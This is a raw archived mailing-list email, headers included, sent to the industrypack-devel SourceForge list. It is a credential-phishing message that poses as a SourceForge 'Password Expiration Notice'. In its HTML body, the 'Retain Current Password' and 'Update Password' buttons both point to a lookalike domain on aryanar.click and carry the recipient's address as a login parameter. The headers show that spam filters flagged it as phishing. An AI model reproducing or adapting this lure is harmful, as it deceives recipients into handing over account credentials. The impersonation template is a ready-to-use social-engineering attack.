Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id DEDAC9D5896
	for <lists+industrypack-devel@lfdr.de>; Fri, 22 Nov 2024 04:35:18 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1tEKRx-0001Zx-Bz
	for lists+industrypack-devel@lfdr.de;
	Fri, 22 Nov 2024 03:35:17 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <manager@dc113.etius.jp>) id 1tEKRv-0001Zp-Vq
 for industrypack-devel@lists.sourceforge.net;
 Fri, 22 Nov 2024 03:35:15 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=XQcsqsQQAONCAT74lpxXhz6bNxEhz1NSQsYdorRhAiU=; b=LBa9FLUzKAio/BQFI8pVDU+L+L
 aIEbanddpgDlalSaul652ZDIP2O7UNV0BOTMfJJs1aKvchaA4HGjRRriPtKZhxcb0rC8JveDfykx/
 lm9JCXHZsGwJLXoCIEW1fj/mnrl5C1Yzuvw+qjyCrodJfTzSFh6kecrumrK/feO4nIhk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=XQcsqsQQAONCAT74lpxXhz6bNxEhz1NSQsYdorRhAiU=; b=D
 tlyo4ReC09JP5cFZhHLtegPyl+vghN6fwyNaIsKmBO2NHz1jj8JFgJ52Uq5oRYz5qouO1GLCX5BzB
 BRycZpG1S7LCILl55XY7XBtkNJYIcu/q3sLpkwXw2C3ykK/C/D5j8tGlqa+PI8rOU7CsBHx3pywz/
 xl+GMiTDGNohtLXk=;
Received: from [116.80.106.69] (helo=securion24.co.jp)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1tEKRu-0004FG-L9 for industrypack-devel@lists.sourceforge.net;
 Fri, 22 Nov 2024 03:35:15 +0000
Received: (qmail 37345 invoked by VF by uid 0); 22 Nov 2024 12:35:03 +0900
X-Vade-Tracker: score=300, verdict=phishing, state=101
 spamcause=gggruggvucftvghtrhhoucdtuddrgeefuddrfeejgdehlecutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfpvffvrfevnecuuegrihhlohhuthemuceftddtnecuogfjthhmlhfqnhhlhidqqdfrhhhishhhihhnghdqvfefleeiqdduleculdeftddtmdenucfjughrpefhvffufffkgggtgfeshhhqfedttddttdenucfhrhhomheplhhishhtshdrshhouhhrtggvfhhorhhgvgdrnhgvthcuoehmrghnrghgvghrsegutgduudefrdgvthhiuhhsrdhjpheqnecuggftrfgrthhtvghrnhepkeffkeduhfeiffekgeeggeeugeeuiefgffdtffeijeffleehtefggeeivefhieetnecuffhomhgrihhnpegrrhihrghnrghrrdgtlhhitghknecukfhppedutdefrdeijedrudeliedrvddugeenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepihhnvghtpedutdefrdeijedrudeliedrvddugedphhgvlhhopegluddtfedrieejrdduleeirddvudegngdpmhgrihhlfhhrohhmpehmrghnrghgvghrsegutgduudefrdgvthhiuhhsrdhjphdpnhgspghrtghpthhtohepuddprhgtphhtthhopehinhguuhhsthhrhihprggtkhdquggvvhgvlheslhhishhtshdrshhouhhrtggvfhhorhhgvgdrnhgvth
Received: from unknown (HELO ?103.67.196.214?)
 (manager@dc113.etius.jp@103.67.196.214)
 by dc113.etius.jp (116.80.106.69) with ESMTPA; 22 Nov 2024 12:35:03 +0900
From: lists.sourceforge.net <manager@dc113.etius.jp>
To: industrypack-devel@lists.sourceforge.net
Date: 22 Nov 2024 10:34:53 +0700
Message-ID: <20241122103453.394A62FC8B5099FC@dc113.etius.jp>
MIME-Version: 1.0
X-Spam-Score: 6.3 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Password Expiration Notice Your password expires soon, Please
 update your password to ensure continued access to your email account. 2
 Retain Current Password Update Password 
 Content analysis details:   (6.3 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: aryanar.click]
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [116.80.106.69 listed in sa-accredit.habeas.com]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [116.80.106.69 listed in bl.score.senderscore.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 2.0 PDS_OTHER_BAD_TLD      Untrustworthy TLDs
 [URI: emaildomain.aryanar.click] [(click)]
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.8 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 0.2 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
X-Headers-End: 1tEKRu-0004FG-L9
Subject: [Industrypack-devel] Expiration Notice 11/22/2024 10:34:53 a.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2552267218118061260=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2552267218118061260==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<div style=3D'color: rgb(33, 33, 33); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: "Segoe UI", Tahoma, Arial, sans-ser=
if; font-size: 15px; font-style: normal; font-weight: 400; word-spacing: 0p=
x; white-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 2=
55, 255); font-variant-ligatures: normal; font-variant-caps: normal; -webki=
t-text-stroke-width: 0px; text-decoration-thickness: initial; text-decorati=
on-style: initial; text-decoration-color: initial;'>
<div align=3D"center" style=3D"position: static !important;"><table width=
=3D"640" style=3D"width: 480pt; border-collapse: collapse; background-color=
: transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr=
><td valign=3D"top" style=3D"margin: 0px; padding: 0px; font-family: Roboto=
, Helvetica, Arial, sans-serif;"><div align=3D"center" style=3D"position: s=
tatic !important;">
<table width=3D"640" style=3D"width: 480pt; border-collapse: collapse; back=
ground-color: transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
"><tbody><tr><td valign=3D"top" style=3D"margin: 0px; padding: 0px;"><div a=
lign=3D"center"><table width=3D"640" style=3D"width: 480pt; border-collapse=
: collapse; background-color: transparent;" border=3D"0" cellspacing=3D"0" =
cellpadding=3D"0"><tbody><tr><td width=3D"616" valign=3D"top" style=3D"marg=
in: 0px; padding: 9pt 0.25in; width: 462pt;">
<table width=3D"592" style=3D"width: 444pt; border-collapse: collapse; back=
ground-color: transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
"><tbody><tr><td valign=3D"top" style=3D"margin: 0px; padding: 0px;"><p sty=
le=3D"margin: 0in 0in 12pt; font-family: Calibri, sans-serif; font-size: 12=
pt;"><span style=3D'color: rgb(26, 26, 31); letter-spacing: -0.1pt; font-fa=
mily: "Segoe UI Semibold", sans-serif; font-size: 21pt;'><b>Password Expira=
tion Notice</b></span></p>
<p style=3D"margin: 0px; font-family: Calibri, sans-serif; font-size: 12pt;=
"><span style=3D'color: rgb(26, 26, 31); font-family: "Segoe UI", sans-seri=
f;'>Your password expires soon, Please update your password to ensure conti=
nued access to your email account. 2</span><br><br></p></td><td valign=3D"t=
op" style=3D"margin: 0px; padding: 0px; width: 0.3pt;">&nbsp;</td></tr></tb=
ody></table></td></tr></tbody></table></div><div align=3D"center">
<table width=3D"640" style=3D"width: 480pt; border-collapse: collapse; back=
ground-color: transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
"><tbody><tr><td width=3D"616" valign=3D"top" style=3D"margin: 0px; padding=
: 9pt 0.25in; width: 462pt;"><table width=3D"592" style=3D"width: 444pt; bo=
rder-collapse: collapse; background-color: transparent;" border=3D"0" cells=
pacing=3D"0" cellpadding=3D"0"><tbody><tr><td valign=3D"top" style=3D"margi=
n: 0px; padding: 0px;">
<table style=3D"border-collapse: collapse; background-color: transparent;" =
border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"ce=
nter" style=3D"margin: 0px; padding: 8px 12px; line-height: 20px; font-size=
: 14px;" bgcolor=3D"#eaeaea">
<a style=3D"color: rgb(33, 33, 33); font-size: 15px; cursor: pointer; text-=
decoration-thickness: initial; text-decoration-style: initial; text-decorat=
ion-color: initial; text-decoration-line: none;" href=3D"https://emaildomai=
n.aryanar.click/evanjohn?login=3Dindustrypack-devel@lists.sourceforge.net" =
target=3D"_blank" rel=3D"noreferrer noopener"><b>Retain Current Password</b=
></a></td>
<td align=3D"center" style=3D"margin: 0px; padding: 10px 4px; line-height: =
20px; font-size: 14px;">&nbsp;</td><td align=3D"center" style=3D"margin: 0p=
x; padding: 10px 100px; line-height: 20px; font-size: 14px;">&nbsp;</td><td=
 align=3D"center" style=3D"margin: 0px; padding: 8px 12px; line-height: 20p=
x; font-size: 14px;" bgcolor=3D"#007acc">
<a style=3D"color: white; font-size: 15px; cursor: pointer; text-decoration=
-thickness: initial; text-decoration-style: initial; text-decoration-color:=
 initial; text-decoration-line: none;" href=3D"https://emaildomain.aryanar.=
click/evanjohn?login=3Dindustrypack-devel@lists.sourceforge.net" target=3D"=
_blank" rel=3D"noreferrer noopener"><b>Update Password</b></a></td></tr></t=
body></table></td><td valign=3D"top" style=3D"margin: 0px; padding: 0px; wi=
dth: 0.3pt;">&nbsp;</td></tr>
</tbody></table></td></tr></tbody></table></div></td></tr></tbody></table><=
/div></td></tr></tbody></table></div></div>
<div align=3D"center" style=3D"color: rgb(34, 34, 34); text-transform: none=
; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, =
sans-serif; font-size: small; font-style: normal; font-weight: 400; word-sp=
acing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: r=
gb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: norma=
l; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text=
-decoration-style: initial; text-decoration-color:=20
initial;"><table width=3D"640" style=3D"width: 480pt; border-collapse: coll=
apse; background-color: transparent;" border=3D"1" cellspacing=3D"0" cellpa=
dding=3D"0"><tbody><tr><td valign=3D"top" style=3D"border-width: 1pt; borde=
r-style: solid; margin: 0px; padding: 9pt 0px; font-family: Roboto, Helveti=
ca, Arial, sans-serif;"><div align=3D"center" style=3D"position: static !im=
portant;">
<table width=3D"640" style=3D"width: 480pt; border-collapse: collapse; back=
ground-color: transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0=
"><tbody><tr><td width=3D"616" valign=3D"top" style=3D"margin: 0px; padding=
: 9pt 0.25in; width: 462pt;"><table width=3D"592" style=3D"width: 444pt; bo=
rder-collapse: collapse; background-color: transparent;" border=3D"0" cells=
pacing=3D"0" cellpadding=3D"0"><tbody><tr><td valign=3D"top" style=3D"margi=
n: 0px; padding: 0px;">
<p style=3D"margin: 0in 0in 12pt; font-family: Calibri, sans-serif; font-si=
ze: 12pt;"><span style=3D"font-size: 18pt; font-weight: bold;">Account Info=
rmation:</span></p><p style=3D"margin: 0in 0in 9pt; font-family: Calibri, s=
ans-serif; font-size: 12pt;"><span style=3D"color: rgb(26, 26, 31); font-we=
ight: bold;">Email Address:&nbsp;</span>&nbsp;<b><span style=3D'color: rgb(=
37, 36, 35); font-family: "SF Regular", "Segoe UI Regular", sans-serif; fon=
t-size: 14px; background-color: rgb(219, 244, 253);'>
&nbsp;<a style=3D"color: rgb(34, 34, 34);">industrypack-devel@lists.sourcef=
orge.net</a></span></b><br></p><p style=3D"margin: 0in 0in 9pt; font-family=
: Calibri, sans-serif; font-size: 12pt;"><b><span style=3D"color: rgb(26, 2=
6, 31);">Password Status:&nbsp;<span style=3D"color: rgb(243, 12, 46);">Exp=
iring Soon</span></span></b></p></td><td valign=3D"top" style=3D"margin: 0p=
x; padding: 0px; width: 0.3pt;">&nbsp;</td></tr></tbody></table></td></tr><=
/tbody></table></div></td></tr></tbody></table></div>


</body></html>


--===============2552267218118061260==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2552267218118061260==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2552267218118061260==--
